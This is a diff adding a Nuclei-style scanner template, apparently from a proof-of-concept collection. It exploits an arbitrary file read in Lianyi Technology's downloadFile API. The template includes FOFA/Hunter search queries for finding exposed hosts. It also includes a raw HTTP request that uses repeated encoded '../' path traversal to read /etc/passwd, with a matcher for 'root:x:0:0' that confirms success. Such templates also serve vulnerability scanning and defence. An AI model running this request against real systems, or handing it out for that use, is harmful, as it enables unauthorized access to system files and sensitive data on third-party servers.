@@ -1,0 +1,26 @@
+id: lianyi-downloadfile-file-read
+
+info:
+  name: 联奕科技 downloadFile 组件任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: fofa:body=" window.mobileSafePassWord"||body="解决 IE8、IE9 不支持 console 问题" hunter:web.body="window.mobileSafePassWord"
+      该漏洞源于联奕科技 downloadFile 组件未正确校验文件访问路径，攻击者可通过构造恶意路径参数实现任意文件读取，导致系统配置文件、敏感数据等非授权访问。
+  tags: 联奕科技
+
+http:
+- raw:
+  - |
+    GET /api/bd-api/apiSearch/downloadFile?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate, br
+    Accept: */*
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
